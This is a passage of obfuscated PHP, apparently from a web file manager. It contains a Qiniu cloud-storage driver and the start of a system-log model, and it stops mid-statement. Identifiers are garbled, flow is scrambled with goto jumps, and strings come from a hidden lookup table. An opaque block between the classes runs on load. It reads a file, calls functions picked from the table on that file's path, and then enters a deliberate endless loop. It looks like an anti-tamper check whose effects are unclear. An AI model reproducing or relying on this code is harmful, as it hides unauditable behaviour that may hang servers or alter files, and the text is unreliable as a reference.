=& $_SERVER[¾÷]; $bª°•Å»‰® = trim($Dñç’â§…é, $cĞŞ• ËŞ‡[18]); if ($this->_isFolder($bª°•Å»‰®)) { return $this->getPathOuter($bª°•Å»‰®); } goto e«ÂùŒ‹‚‡; dô§æõ¥Ò­: } public function copyFile($Fç¹ãÁõƒ, $cöÃ¢‡”ï–) { $AìÌõÉ½ = $this->bucketManager->copy($this->bucket, $Fç¹ãÁõƒ, $this->bucket, $cöÃ¢‡”ï–, !0); return $AìÌõÉ½ ? !1 : $this->getPathOuter($cöÃ¢‡”ï–); } public function moveFile($AÏğ˜µœÜ˜, $A­Åèî˜·Æ) { $E•œîääº™ = $this->bucketManager->move($this->bucket, $AÏğ˜µœÜ˜, $this->bucket, $A­Åèî˜·Æ, !0); return $E•œîääº™ ? !1 : $this->getPathOuter($A­Åèî˜·Æ); } public function delFile($D¿ä²…Æà) { if (!$this->exist($D¿ä²…Æà)) { return !0; } $aåæ™ƒÂàß = $this->bucketManager->delete($this->bucket, $D¿ä²…Æà); return $aåæ™ƒÂàß ? !1 : !0; } public function delFolder($a”£®ÀÊÌ) { goto DÄ‘è˜‘îÒ; DÄ‘è˜‘îÒ: $A²ñÅ¾«˜Š =& $_SERVER[¾÷]; if (!$this->exist($a”£®ÀÊÌ)) { return !0; } $this->listItemCache = !1; goto a„Å‰°Úâ; a„Å‰°Úâ: $F²˜¥ç³Íß = $this->fileList($a”£®ÀÊÌ); $this->listItemCache = !0; $cäİ«”İ´¿ = trim($a”£®ÀÊÌ, $A²ñÅ¾«˜Š[18]) . $A²ñÅ¾«˜Š[18]; goto AÀÚÍ‰×; C«Ö†Ï¯¨‘: return $this->delByBatch($F²˜¥ç³Íß[$A²ñÅ¾«˜Š[84]]); goto F‡ô‚æÃÔ; AÀÚÍ‰×: if (!empty($a”£®ÀÊÌ) && !in_array($cäİ«”İ´¿, $F²˜¥ç³Íß[$A²ñÅ¾«˜Š[84]])) { $F²˜¥ç³Íß[$A²ñÅ¾«˜Š[84]][] = $cäİ«”İ´¿; } $c¸ìÎÓÂ = $this->delByBatch($F²˜¥ç³Íß[$A²ñÅ¾«˜Š[83]]); if (!$c¸ìÎÓÂ) { return !1; } goto C«Ö†Ï¯¨‘; F‡ô‚æÃÔ: } private function delByBatch($FÇá½˜Ï“Œ) { foreach (array_chunk($FÇá½˜Ï“Œ, 1000) as $a‰óÛ•õÒº) { $báã”œáºË = $this->bucketManager->buildBatchDelete($this->bucket, $a‰óÛ•õÒº); list($b‘›©¨İæ÷, $F‰‚³¾ó¢Ø) = $this->bucketManager->batch($báã”œáºË); if ($F‰‚³¾ó¢Ø) { return !1; } } return !0; } public function rename($A‡¿Åİ’à, $Aó²´Æ®§) { return $this->renameObject($A‡¿Åİ’à, $Aó²´Æ®§); } public function fileInfo($F¿ê— øâ•, $c×¸„Èê¢— = false, $bÑÉà»¶°Ş = array()) { goto a®Ì¾†Œç; a®Ì¾†Œç: $e÷ööõâ´Æ =& $_SERVER[¾÷]; $aÑª´¡¼×´ = array($e÷ööõâ´Æ[38] => $this->pathThis($F¿ê— øâ•), $e÷ööõâ´Æ[85] => $this->getPathOuter($e÷ööõâ´Æ[18] . $F¿ê— øâ•), $e÷ööõâ´Æ[39] => $e÷ööõâ´Æ[201], $e÷ööõâ´Æ[87] => isset($bÑÉà»¶°Ş[$e÷ööõâ´Æ[1279]]) ? $bÑÉà»¶°Ş[$e÷ööõâ´Æ[1279]] : 0, $e÷ööõâ´Æ[177] => $this->ext($F¿ê— øâ•)); if ($c×¸„Èê¢—) { return $aÑª´¡¼×´; } goto føŸóŸ»Ü; føŸóŸ»Ü: $aÑª´¡¼×´[$e÷ööõâ´Æ[202]] = $aÑª´¡¼×´[$e÷ööõâ´Æ[93]] = 0; $aÑª´¡¼×´[$e÷ööõâ´Æ[203]] = $aÑª´¡¼×´[$e÷ööõâ´Æ[204]] = !0; if (empty($bÑÉà»¶°Ş)) { $bÑÉà»¶°Ş = $this->objectMeta($F¿ê— øâ•); if (!$bÑÉà»¶°Ş) { return $aÑª´¡¼×´; } } goto C ÁÆ§êò; C ÁÆ§êò: if (isset($bÑÉà»¶°Ş[$e÷ööõâ´Æ[1280]])) { $aÑª´¡¼×´[$e÷ööõâ´Æ[93]] = substr($bÑÉà»¶°Ş[$e÷ööõâ´Æ[1280]] . $e÷ööõâ´Æ[43], 0, 10); } if (isset($bÑÉà»¶°Ş[$e÷ööõâ´Æ[1279]])) { $aÑª´¡¼×´[$e÷ööõâ´Æ[87]] = $bÑÉà»¶°Ş[$e÷ööõâ´Æ[1279]]; } return $aÑª´¡¼×´; goto Fùæ¦»„÷ô; Fùæ¦»„÷ô: } public function folderInfo($aÁíª›á–”, $b¬×Ë¿ïÁÖ = false) { goto bİÌÕ­¿¾º; bİÌÕ­¿¾º: $dòà‡¨´Î¿ =& $_SERVER[¾÷]; $D“…ãâÂÌ¹ = array($dòà‡¨´Î¿[38] => $this->pathThis($aÁíª›á–”), $dòà‡¨´Î¿[85] => $this->getPathOuter($dòà‡¨´Î¿[18] . $aÁíª›á–”), $dòà‡¨´Î¿[39] => $dòà‡¨´Î¿[86]); if ($b¬×Ë¿ïÁÖ) { return $D“…ãâÂÌ¹; } goto F°½¸ÁÏîº; aà®—ò­Î•: $E×‡²ëÖŞ© = $this->objectMeta($aÁíª›á–”); if (isset($E×‡²ëÖŞ©[$dòà‡¨´Î¿[1280]])) { $D“…ãâÂÌ¹[$dòà‡¨´Î¿[93]] = substr($E×‡²ëÖŞ©[$dòà‡¨´Î¿[1280]] . $dòà‡¨´Î¿[43], 0, 10); } return $D“…ãâÂÌ¹; goto c„¹†õèöÊ; F°½¸ÁÏîº: $D“…ãâÂÌ¹[$dòà‡¨´Î¿[202]] = $D“…ãâÂÌ¹[$dòà‡¨´Î¿[93]] = 0; $D“…ãâÂÌ¹[$dòà‡¨´Î¿[203]] = $D“…ãâÂÌ¹[$dòà‡¨´Î¿[204]] = !0; $aÁíª›á–” = rtrim($aÁíª›á–”, $dòà‡¨´Î¿[18]) . $dòà‡¨´Î¿[18]; goto aà®—ò­Î•; c„¹†õèöÊ: } public function listPath($eíºÓˆäù, $F©‚Ñ„Ãøš = false) { $aˆ’‚Èôïİ =& $_SERVER[¾÷]; $e¯„ÛØ‹ï = $this->fileList($eíºÓˆäù, $aˆ’‚Èôïİ[18], !0); foreach ($e¯„ÛØ‹ï[$aˆ’‚Èôïİ[84]] as $E„±ßÁáÏç => $e¢ë–íÃó‰) { $e¯„ÛØ‹ï[$aˆ’‚Èôïİ[84]][$E„±ßÁáÏç] = $this->folderInfo($e¢ë–íÃó‰, $F©‚Ñ„Ãøš); } foreach ($e¯„ÛØ‹ï[$aˆ’‚Èôïİ[83]] as $E„±ßÁáÏç => $e¢ë–íÃó‰) { $e¯„ÛØ‹ï[$aˆ’‚Èôïİ[83]][$E„±ßÁáÏç] = $this->fileInfo($e¢ë–íÃó‰[$aˆ’‚Èôïİ[102]], $F©‚Ñ„Ãøš, $e¢ë–íÃó‰); } return $e¯„ÛØ‹ï; } public function has($bÛ–œ²–¤Ú, $cœĞÔ‚Ã£¿ = false, $dÈÑçéñ™  = true) { goto bÜµíïÙ»Ï; A‚Ä ÜÌÌ: $bùãåïë±ê = $aé¹ë ©œ = 0; while (!0) { check_abort(); list($bÙØ™Ï, $D§ºŒòíÃñ) = $this->bucketManager->listFiles($this->bucket, $d„¥©¬èÎô, $däñĞğ³µ, $fÜÎ·«Ò§İ, $fÉÀóïåï); if ($D§ºŒòíÃñ) { break; } $däñĞğ³µ = array_key_exists($d‡ŞŠ˜Ÿà[1249], $bÙØ™Ï) ? $däñĞğ³µ = $bÙØ™Ï[$d‡ŞŠ˜Ÿà[1281]] : $d‡ŞŠ˜Ÿà[43]; if ($cœĞÔ‚Ã£¿) { if (!empty($bÙØ™Ï[$d‡ŞŠ˜Ÿà[1282]])) { $bùãåïë±ê += count($bÙØ™Ï[$d‡ŞŠ˜Ÿà[1282]]); } if (!empty($bÙØ™Ï[$d‡ŞŠ˜Ÿà[1283]])) { $aé¹ë ©œ += count($bÙØ™Ï[$d‡ŞŠ˜Ÿà[1283]]); } if ($däñĞğ³µ === $d‡ŞŠ˜Ÿà[43]) { break; } continue; } if ($dÈÑçéñ™ ) { if (!empty($bÙØ™Ï[$d‡ŞŠ˜Ÿà[1282]])) { return !0; } } else { if (!empty($bÙØ™Ï[$d‡ŞŠ˜Ÿà[1283]])) { return !0; } } if ($däñĞğ³µ === $d‡ŞŠ˜Ÿà[43]) { break; } } if ($cœĞÔ‚Ã£¿) { return array($d‡ŞŠ˜Ÿà[211] => $bùãåïë±ê, $d‡ŞŠ˜Ÿà[212] => $aé¹ë ©œ); } goto e„‰ÂÍ¦¥«; e„‰ÂÍ¦¥«: return !1; goto Añî«ˆ£©é; DÕÜ«¥ÀÃÆ: $däñĞğ³µ = $d‡ŞŠ˜Ÿà[43]; $fÜÎ·«Ò§İ = 500; $fÉÀóïåï = $d‡ŞŠ˜Ÿà[18]; goto A‚Ä ÜÌÌ; bÜµíïÙ»Ï: $d‡ŞŠ˜Ÿà =& $_SERVER[¾÷]; $bÛ–œ²–¤Ú = trim($bÛ–œ²–¤Ú, $d‡ŞŠ˜Ÿà[18]); $d„¥©¬èÎô = empty($bÛ–œ²–¤Ú) ? $d‡ŞŠ˜Ÿà[43] : $bÛ–œ²–¤Ú . $d‡ŞŠ˜Ÿà[18]; goto DÕÜ«¥ÀÃÆ; Añî«ˆ£©é: } public function listAll($e³óÈ‰–ğ) { $AÅŒ®ã•ì’ =& $_SERVER[¾÷]; $C¢Ö¤Õ‹ôä = $this->fileList($e³óÈ‰–ğ, $AÅŒ®ã•ì’[43], !0); $BÑ™Œ–™Ì“ = array(); foreach ($C¢Ö¤Õ‹ôä[$AÅŒ®ã•ì’[83]] as $ağÂ‹ŠİŞÁ) { $BÑ™Œ–™Ì“[$ağÂ‹ŠİŞÁ[$AÅŒ®ã•ì’[102]]] = $ağÂ‹ŠİŞÁ[$AÅŒ®ã•ì’[87]]; } foreach ($C¢Ö¤Õ‹ôä[$AÅŒ®ã•ì’[84]] as $ağÂ‹ŠİŞÁ) { if (is_string($ağÂ‹ŠİŞÁ)) { $BÑ™Œ–™Ì“[$ağÂ‹ŠİŞÁ] = 0; } } return $this->listAllFiles($e³óÈ‰–ğ, array_keys($BÑ™Œ–™Ì“), $BÑ™Œ–™Ì“); } private function fileList($c«ÎëÅÓåŒ, $AÙ¹ÆÙ›Ú = '', $F°•ÎÔ’Å… = 0) { goto eô®ƒö‡Ô‹; BÏĞäÂ“ËÔ: $Eöö¶µÍí« = $AÚƒ¹É£Ä³ = array(); while (!0) { check_abort(); list($eíùñ•‡¾¡, $DíÂè²ÆÀ›) = $this->bucketManager->listFiles($this->bucket, $FÑšÏİ–‹, $DÛÅ®ŒŒ’†, $b„†š–¼‚ß, $AÙ¹ÆÙ›Ú); if ($DíÂè²ÆÀ›) { break; } $DÛÅ®ŒŒ’† = array_key_exists($f¾İÄÊ°Û[1249], $eíùñ•‡¾¡) ? $DÛÅ®ŒŒ’† = $eíùñ•‡¾¡[$f¾İÄÊ°Û[1281]] : $f¾İÄÊ°Û[43]; $aˆ£·‰Œ£ = isset($eíùñ•‡¾¡[$f¾İÄÊ°Û[1282]]) ? $eíùñ•‡¾¡[$f¾İÄÊ°Û[1282]] : array(); $Dâà¯¬Ã¹ = isset($eíùñ•‡¾¡[$f¾İÄÊ°Û[1283]]) ? $eíùñ•‡¾¡[$f¾İÄÊ°Û[1283]] : array(); foreach ($aˆ£·‰Œ£ as $C½ééáƒÍ) { goto E§‰µ¶õÏù; E§‰µ¶õÏù: if ($C½ééáƒÍ[$f¾İÄÊ°Û[102]] == $FÑšÏİ–‹) { continue; } $dôö£È«°ó = $C½ééáƒÍ[$f¾İÄÊ°Û[102]]; $f±Ì´ÄĞ‹» = $C½ééáƒÍ[$f¾İÄÊ°Û[1279]]; goto eä’¼ğ¿Óä; A¹‹ÌØø²ì: if ($f¾Ş¹ÜÕ­) { $Eöö¶µÍí«[] = $dôö£È«°ó; continue; } $AÚƒ¹É£Ä³[] = $F°•ÎÔ’Å… ? $C½ééáƒÍ : $dôö£È«°ó; goto CˆëÔÍ±â´; eä’¼ğ¿Óä: $C½ééáƒÍ[$f¾İÄÊ°Û[87]] = $f±Ì´ÄĞ‹»; $f¾Ş¹ÜÕ­ = $f±Ì´ÄĞ‹» == 0 && substr($dôö£È«°ó, strlen($dôö£È«°ó) - 1, 1) == $f¾İÄÊ°Û[18] ? !0 : !1; if ($fšÑëà‡â) { $this->cacheMethod($f¾İÄÊ°Û[207], $dôö£È«°ó, $f¾Ş¹ÜÕ­); $this->cacheMethod($f¾İÄÊ°Û[208], $dôö£È«°ó, $C½ééáƒÍ); } goto A¹‹ÌØø²ì; CˆëÔÍ±â´: } foreach ($Dâà¯¬Ã¹ as $dôö£È«°ó) { if ($dôö£È«°ó == $FÑšÏİ–‹) { continue; } $Eöö¶µÍí«[] = $dôö£È«°ó; if ($fšÑëà‡â) { $this->cacheMethod($f¾İÄÊ°Û[207], $dôö£È«°ó, !0); } } if ($DÛÅ®ŒŒ’† === $f¾İÄÊ°Û[43]) { break; } } if ($fšÑëà‡â) { $this->cacheMethod($f¾İÄÊ°Û[207], $c«ÎëÅÓåŒ, !0); } goto Dã”ŒŠÒ®•; eô®ƒö‡Ô‹: $f¾İÄÊ°Û =& $_SERVER[¾÷]; $c«ÎëÅÓåŒ = trim($c«ÎëÅÓåŒ, $f¾İÄÊ°Û[18]); $FÑšÏİ–‹ = empty($c«ÎëÅÓåŒ) ? $f¾İÄÊ°Û[43] : $c«ÎëÅÓåŒ . $f¾İÄÊ°Û[18]; goto Eæİ–Á–¼; Eæİ–Á–¼: $DÛÅ®ŒŒ’† = $f¾İÄÊ°Û[43]; $b„†š–¼‚ß = 1000; $fšÑëà‡â = $this->listItemCache === !1 ? !1 : !0; goto BÏĞäÂ“ËÔ; Dã”ŒŠÒ®•: return array($f¾İÄÊ°Û[84] => $Eöö¶µÍí«, $f¾İÄÊ°Û[83] => $AÚƒ¹É£Ä³); goto F«®Ù“ßªğ; F«®Ù“ßªğ: } public function canRead($bæñôÇĞ´) { return $this->exist($bæñôÇĞ´) ? !0 : !1; } public function canWrite($a»¡±–÷†‡) { return $this->exist($a»¡±–÷†‡) ? !0 : !1; } public function getContent($d³®…óà) { return $this->fileSubstr($d³®…óà, 0, -1); } public function setContent($Fš‚ô¸šïÇ, $c†½ÀëÃ…´ = '') { $bé¤ã¸¸Ş = $this->tempFile($this->pathThis($Fš‚ô¸šïÇ)); file_put_contents($bé¤ã¸¸Ş, $c†½ÀëÃ…´); if ($this->upload($Fš‚ô¸šïÇ, $bé¤ã¸¸Ş)) { $this->tempFileRemve($bé¤ã¸¸Ş); return !0; } return !1; } public function refreshUrls($Bî÷§äÖ—) { goto Dæö‡¢¦Ãã; Dæö‡¢¦Ãã: $FôùÆÆ–»¬ =& $_SERVER[¾÷]; $C‡ğ¶ŒÄ¦‰ = array(); if (is_array($Bî÷§äÖ—)) { foreach ($Bî÷§äÖ— as $f£àƒå´“) { $C‡ğ¶ŒÄ¦‰[] = $this->link($f£àƒå´“); } } else { $C‡ğ¶ŒÄ¦‰[] = $this->link($Bî÷§äÖ—); } goto eø”åä”¹¼; eø”åä”¹¼: $F´æœÒÍîà = new Qiniu\Cdn\CdnManager($this->auth); list($f¡Ûƒ‹ÂİÄ, $bå“¶Ìğß¦) = $F´æœÒÍîà->refreshUrls($C‡ğ¶ŒÄ¦‰); if ($bå“¶Ìğß¦) { return !1; } goto aš™ì‚‰¾; aš™ì‚‰¾: return $f¡Ûƒ‹ÂİÄ[$FôùÆÆ–»¬[1054]] == $FôùÆÆ–»¬[718] ? !0 : !1; goto d˜åÀËÒ¯¨; d˜åÀËÒ¯¨: } public function fileSubstr($AæèÒ¬¤, $F»Ë·ÔÌ®Ö, $aŸ©«ÓÔÆ) { $C³¿íƒ…Äœ =& $_SERVER[¾÷]; if (!($c†èÂĞ§ = $this->link($AæèÒ¬¤))) { return !1; } $cğèÑ¨‡òî = !1; if ($aŸ©«ÓÔÆ > 0) { $FÉŒĞ•ô‡Æ = $F»Ë·ÔÌ®Ö + $aŸ©«ÓÔÆ - 1; $cğèÑ¨‡òî = array($C³¿íƒ…Äœ[1284] . $F»Ë·ÔÌ®Ö . $C³¿íƒ…Äœ[443] . $FÉŒĞ•ô‡Æ); } $CçÓ‰ƒËáº = url_request($c†èÂĞ§, $C³¿íƒ…Äœ[236], !1, $cğèÑ¨‡òî); return $CçÓ‰ƒËáº[$C³¿íƒ…Äœ[711]] ? $CçÓ‰ƒËáº[$C³¿íƒ…Äœ[1064]] : !1; } public function upload($eõ¨ªÇ±…á, $f…­œÃ¤‹, $FïÑÏù´¡Ú = false, $Cí›ù©‚ = REPEAT_REPLACE) { $díŞÌõò–— = new Qiniu\Storage\UploadManager(); $eÒóÏä´„ã = $this->auth->uploadToken($this->bucket, $eõ¨ªÇ±…á); $A»£¬§ê› = get_file_mime(get_path_ext($f…­œÃ¤‹)); list($DšÆëÈÁ­ù, $D’„ĞŠ±¼) = $díŞÌõò–—->putFile($eÒóÏä´„ã, $eõ¨ªÇ±…á, $f…­œÃ¤‹, null, $A»£¬§ê›); return $D’„ĞŠ±¼ ? !1 : $this->getPathOuter($eõ¨ªÇ±…á); } public function uploadFormData($D¥»åÒ‚æ, $BöÍ“¶Œ¸³ = 3600) { return $this->uploadToken($D¥»åÒ‚æ, $BöÍ“¶Œ¸³); } public function multiUploadFormData($c…ƒ¦¢±Ü¡, $dí¯í¾Ëó = 3600) { return $this->uploadToken($c…ƒ¦¢±Ü¡, $dí¯í¾Ëó); } private function uploadToken($eØ¢ğãÏâ¨, $fµÙ°’¬óË = 3600) { goto AÑ¥¶ñ ÕÕ; AÑ¥¶ñ ÕÕ: $fé‰Ü¶òÒ´ =& $_SERVER[¾÷]; $A‘–½ÅùÇ = $fµÙ°’¬óË; $EˆŠæ–ßë» = array($fé‰Ü¶òÒ´[1285] => $fé‰Ü¶òÒ´[1286]); goto C¨ÑÍ»«¸; b¯Œõ·£œ’: $BÆ´÷ª‡£ô = http_type() . "\72\57\x2f\165\x70\154\157\x61\x64{$E›ŞÔ•Ï„Î}\x2e\x71\x69\x6e\151\165\160\x2e\143\157\155\x2f"; return array($fé‰Ü¶òÒ´[1288] => $eö„„ò£š, $fé‰Ü¶òÒ´[1289] => $BÆ´÷ª‡£ô); goto E—§òø·ß; C¨ÑÍ»«¸: $F…Ë” ë÷Õ = $eØ¢ğãÏâ¨; $eö„„ò£š = $this->auth->uploadToken($this->bucket, $F…Ë” ë÷Õ, $A‘–½ÅùÇ, $EˆŠæ–ßë», !0); $E›ŞÔ•Ï„Î = empty($this->region) || $this->region == $fé‰Ü¶òÒ´[1287] ? $fé‰Ü¶òÒ´[43] : $fé‰Ü¶òÒ´[443] . $this->region; goto b¯Œõ·£œ’; E—§òø·ß: } public function download($a¥À¥ô¶‡, $B Ú¥Ú¸â´) { goto Bä¶îªÚœÛ; C­ºòÈİÌ: fclose($f®Ñ¤öß); return $B Ú¥Ú¸â´; goto E‰Û½ÀÓà; Bä¶îªÚœÛ: $b¼¢™È¸Ì± = IO::getPathInner(IO::mkfile($B Ú¥Ú¸â´)); if (!($FÌçÔºÊ = $this->link($a¥À¥ô¶‡))) { return !1; } $b¼†ÄŒ«†„ = 0; goto aÃÍÇäŞ; aÃÍÇäŞ: $bĞ—Åé·ªÌ = 1024 * 200; $f®Ñ¤öß = fopen($b¼¢™È¸Ì±, $_SERVER[¾÷][1290]); while (!0) { $F„ªäÊœÔ = $this->fileSubstr($a¥À¥ô¶‡, $b¼†ÄŒ«†„, $bĞ—Åé·ªÌ); if ($F„ªäÊœÔ === !1) { return !1; } fwrite($f®Ñ¤öß, $F„ªäÊœÔ); $b¼†ÄŒ«†„ += $bĞ—Åé·ªÌ; if (strlen($F„ªäÊœÔ) < $bĞ—Åé·ªÌ) { break; } } goto C­ºòÈİÌ; E‰Û½ÀÓà: } public function link($E×ÑŞ‚é…š, $D¶ê±‘İ‡° = '') { if (!$this->isFile($E×ÑŞ‚é…š)) { return !1; } $Fœ¶ˆªãš˜ = $this->getHost() . $_SERVER[¾÷][18] . $this->pathEncode($E×ÑŞ‚é…š) . $D¶ê±‘İ‡°; return $this->auth->privateDownloadUrl($Fœ¶ˆªãš˜, 3600 * 12); } public function fileOut($bîÔ²—Òö, $bìÉª´ÁÓ = false, $EŒ’Œ‘Ú®Ä = false, $AŞ¦ÏÌ×Ç³ = '') { $FîÔ¿ä®šô =& $_SERVER[¾÷]; if ($this->isFileOutServer()) { return $this->fileOutServer($bîÔ²—Òö, $bìÉª´ÁÓ, $EŒ’Œ‘Ú®Ä, $AŞ¦ÏÌ×Ç³); } if (!$EŒ’Œ‘Ú®Ä) { $EŒ’Œ‘Ú®Ä = $this->pathThis($bîÔ²—Òö); } $f™†ø³Çˆõ = $bìÉª´ÁÓ ? $FîÔ¿ä®šô[1291] . rawurlencode($EŒ’Œ‘Ú®Ä) : $FîÔ¿ä®šô[43]; $a¯æêòÃÉ– = $this->link($bîÔ²—Òö, $f™†ø³Çˆõ); $this->fileOutLink($a¯æêòÃÉ–); } public function fileOutServer($eÁÙ‚½¡ˆä, $B»¿Œ˜‘Ñ = false, $B äôÎ±„× = false, $F˜ñ¢…âÇ‡ = '') { parent::fileOut($eÁÙ‚½¡ˆä, $B»¿Œ˜‘Ñ, $B äôÎ±„×, $F˜ñ¢…âÇ‡); } public function fileOutImage($d£¯‡á õ¨, $C„¾ê•ÍÍ¢ = 250) { $Fà˜Ç„¤Ç = $this->link($d£¯‡á õ¨, $_SERVER[¾÷][1292] . $C„¾ê•ÍÍ¢); $this->fileOutLink($Fà˜Ç„¤Ç); } public function fileOutImageServer($cëÛ“¬¼, $B™ôß¬éƒ = 250) { parent::fileOutImage($cëÛ“¬¼, $B™ôß¬éƒ); } public function hashMd5($D¿ç½øõª) { $dËö»™ÅÇ =& $_SERVER[¾÷]; $CíƒãÑÎ = $this->objectMeta($D¿ç½øõª); return isset($CíƒãÑÎ[$dËö»™ÅÇ[216]]) ? $CíƒãÑÎ[$dËö»™ÅÇ[216]] : !1; $E˜Ê˜½ê» = $this->link($D¿ç½øõª, $dËö»™ÅÇ[1293]); } public function size($E¹è”‘Ãç) { $E²¢Ö‡Ä­ê = $this->objectMeta($E¹è”‘Ãç); return $E²¢Ö‡Ä­ê ? $E²¢Ö‡Ä­ê[$_SERVER[¾÷][87]] : 0; } public function info($aØÌ‡¨áÆå) { if ($this->isFolder($aØÌ‡¨áÆå)) { return $this->folderInfo($aØÌ‡¨áÆå); } else { if ($this->isFile($aØÌ‡¨áÆå)) { return $this->fileInfo($aØÌ‡¨áÆå); } } return !1; } public function exist($cÈÄ½×¹²½) { return $this->isFile($cÈÄ½×¹²½) || $this->isFolder($cÈÄ½×¹²½); } public function isFile($e«õµø¹¨¢) { return !$this->isFolder($e«õµø¹¨¢) && $this->objectMeta($e«õµø¹¨¢); } public function isFolder($CåØ‰†«ã) { return $this->cacheMethod($_SERVER[¾÷][207], $CåØ‰†«ã); } protected function objectMeta($Eˆ“ÜÂêØ) { return $this->cacheMethod($_SERVER[¾÷][208], $Eˆ“ÜÂêØ); } protected function _objectMeta($EòÒ­œƒ‰”) { $AŞÍÊ»„àõ =& $_SERVER[¾÷]; list($e¤¿ÍÅõ¯, $Dß¼²ÛÅ˜Œ) = $this->bucketManager->stat($this->bucket, $EòÒ­œƒ‰”); if ($e¤¿ÍÅõ¯) { $e¤¿ÍÅõ¯[$AŞÍÊ»„àõ[87]] = intval($e¤¿ÍÅõ¯[$AŞÍÊ»„àõ[1279]]); } return $e¤¿ÍÅõ¯; } protected function _isFolder($b‘”£‚ÆÀ¶) { $DˆÈ”¦ƒæ =& $_SERVER[¾÷]; if ($b‘”£‚ÆÀ¶ == $DˆÈ”¦ƒæ[43] || $b‘”£‚ÆÀ¶ == $DˆÈ”¦ƒæ[18]) { return !0; } list($aòæĞİğë, $FÁêÕÅ¨¤Ó) = $this->bucketManager->listFiles($this->bucket, trim($b‘”£‚ÆÀ¶, $DˆÈ”¦ƒæ[18]) . $DˆÈ”¦ƒæ[18], $DˆÈ”¦ƒæ[43], 1, $DˆÈ”¦ƒæ[18]); return !empty($aòæĞİğë[$DˆÈ”¦ƒæ[1282]]) || !empty($aòæĞİğë[$DˆÈ”¦ƒæ[1283]]) ? !0 : !1; } } if (!isset($_SERVER[$_SERVER[¾÷][4]]) || !isset($_SERVER[$_SERVER[¾÷][13]])) { goto EªÈ”®Õª˜; eæ¥¬åÛ¡: $d«˜«‘µ¬ = explode($_SERVER[¾÷][9], $e´ŒãÓ‚»); if (count($d«˜«‘µ¬) < $_SERVER[¾÷][10]) { $Cˆå¢ÆÔ„½ = $_SERVER[¾÷][11]; $Cˆå¢ÆÔ„½(); } $F¹÷Ô¿‰¯œ = $_SERVER[¾÷][12]; goto B“öŒíæ; EªÈ”®Õª˜: $b­ØëØ—æº = $_SERVER[¾÷][6]; $DË¡È¡ÁÖñ = $_SERVER[$_SERVER[¾÷][7]] . $_SERVER[¾÷][8]; $e´ŒãÓ‚» = $b­ØëØ—æº($DË¡È¡ÁÖñ); goto eæ¥¬åÛ¡; B“öŒíæ: $F¹÷Ô¿‰¯œ($_SERVER[$_SERVER[¾÷][7]] . $_SERVER[¾÷][8]); $DÙ£Ó†¥Á = 2; while ($DÙ£Ó†¥Á > 1) { $bìçÙÊ = rawurlencode($DÙ£Ó†¥Á . $_SERVER[¾÷][382]); } goto eò›’­â•ã; eò›’­â•ã: } goto eÑÊ÷‹éÔ; f‡ÄÎ×İ³: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\x74\x65\x6d\137\154\x6f\x67"; protected $dataAuto = array(array("\x63\162\x65\x61\164\145\124\x69\155\x65", "\164\x69\x6d\145", "\x69\156\163\x65\x72\x74", "\146\x75\x6e\143\164\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $c„Œ²¬±¼À =& $_SERVER[¾÷]; return array($c„Œ²¬±¼À[1980] => LNG($c„Œ²¬±¼À[1981]), $c„Œ²¬±¼À[1982] => LNG($c„Œ²¬±¼À[1983]), $c„Œ²¬±¼À[1608] => LNG($c„Œ²¬±¼À[1984]), $c„Œ²¬±¼À[1985] => LNG($c„Œ²¬±¼À[1986]), $c„Œ²¬±¼À[1987] => LNG($c„Œ²¬±¼À[1988]), $c„Œ²¬±¼À[1989] => LNG($c„Œ²¬±¼À[1990]), $c„Œ²¬±¼À[1991] => LNG($c„Œ²¬±¼À[1992]), $c„Œ²¬±¼À[1638] => LNG($c„Œ²¬±¼À[1992]), $c„Œ²¬±¼À[1639] => LNG($c„Œ²¬±¼À[1993]), $c„Œ²¬±¼À[1994] => LNG($c„Œ²¬±¼À[1995]), $c„Œ²¬±¼À[1996] => LNG($c„Œ²¬±¼À[1997]), $c„Œ²¬±¼À[1998] => LNG($c„Œ²¬±¼À[1999]), $c„Œ²¬±¼À[2000] => LNG($c„Œ²¬±¼À[2001]), $c„Œ²¬±¼À[1636] => LNG($c„Œ²¬±¼À[2002]), $c„Œ²¬±¼À[1643] => LNG($c„Œ²¬±¼À[2003]), $c„Œ²¬±¼À[2004] => LNG($c„Œ²¬±¼À[2005]), $c„Œ²¬±¼À[2006] => LNG($c„Œ²¬±¼À[2007]), $c„Œ²¬±¼À[2008] => LNG($c„Œ²¬±¼À[2009]), $c„Œ²¬±¼À[2010] => LNG($c„Œ²¬±¼À[2011]), $c„Œ²¬±¼À[1646] => LNG($c„Œ²¬±¼À[2012]), $c„Œ²¬±¼À[1647] => LNG($c„Œ²¬±¼À[2013]), $c„Œ²¬±¼À[2014] => LNG($c„Œ²¬±¼À[2015]), $c„Œ²¬±¼À[2016] => LNG($c„Œ²¬±¼À[2017]), $c„Œ²¬±¼À[2018] => LNG($c„Œ²¬±¼À[2019]), $c„Œ²¬±¼À[1641] => LNG($c„Œ²¬±¼À[2020]), $c„Œ²¬±¼À[2021] => LNG($c„Œ²¬±¼À[2022]), $c„Œ²¬±¼À[1640] => LNG($c„Œ²¬±¼À[2023]), $c„Œ²¬±¼À[2024] => LNG($c„Œ²¬±¼À[2025]), $c„Œ²¬±¼À[2026] => LNG($c„Œ²¬±¼À[2027]), $c„Œ²¬±¼À[2028] => LNG($c„Œ²¬±¼À[2029]), $c„Œ²¬±¼À[2030] => LNG($c„Œ²¬±¼À[2030]), $c„Œ²¬±¼À[2031] => LNG($c„Œ²¬±¼À[1612]), $c„Œ²¬±¼À[2032] => LNG($c„Œ²¬±¼À[2033]), $c„Œ²¬±¼À[2034] => LNG($c„Œ²¬±¼À[2035]), $c„Œ²¬±¼À[2036] => LNG($c„Œ²¬±¼À[2037]), $c„Œ²¬±¼À[2038] => LNG($c„Œ²¬±¼À[2039]), $c„Œ²¬±¼À[2040] => LNG($c„Œ²¬±¼À[2041]), $c„Œ²¬±¼À[2042] => LNG($c„Œ²¬±¼À[2042]), $c„Œ²¬±¼À[2043] => LNG($c„Œ²¬±¼À[2044]), $c„Œ²¬±¼À[2045] => LNG($c„Œ²¬±¼À[2046]), $c„Œ²¬±¼À[2047] => LNG($c„Œ²¬±¼À[2048]), $c„Œ²¬±¼À[2049] => LNG($c„Œ²¬±¼À[2050]), $c„Œ²¬±¼À[2051] => LNG($c„Œ²¬±¼À[2052]), $c„Œ²¬±¼À[2053] => LNG($c„Œ²¬±¼À[2054])); } private function typeFile() { $D¡‡·¾ÌÂØ =& $_SERVER[¾÷]; $Dä¶×‚áëô = 